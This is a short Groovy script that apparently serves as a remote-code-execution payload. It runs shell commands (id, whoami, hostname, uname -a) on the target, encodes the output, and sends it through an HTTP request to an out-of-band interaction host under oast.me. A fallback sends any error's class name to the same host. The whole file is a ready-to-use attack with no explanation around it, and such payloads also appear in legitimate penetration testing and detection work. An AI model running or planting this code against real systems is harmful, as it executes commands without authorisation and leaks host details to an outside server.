def OAST = "http://db2ul6a1js91pdqdfa9g3qmzcnndozb4o.oast.me"
try {
    def cmd = ['/bin/sh','-c','id; whoami; hostname; uname -a'].execute(); cmd.waitFor()
    def enc = ((cmd.in.text ?: '') + (cmd.err.text ?: '')).trim().replaceAll(/[^A-Za-z0-9_.-]/,'_')
    new URL(OAST + "/rce-" + (enc.length()>600 ? enc.substring(0,600) : enc)).text
} catch (Throwable t) { try { new URL(OAST + "/rce-ERR-" + t.getClass().getSimpleName()).text } catch (Throwable i) {} }
return null
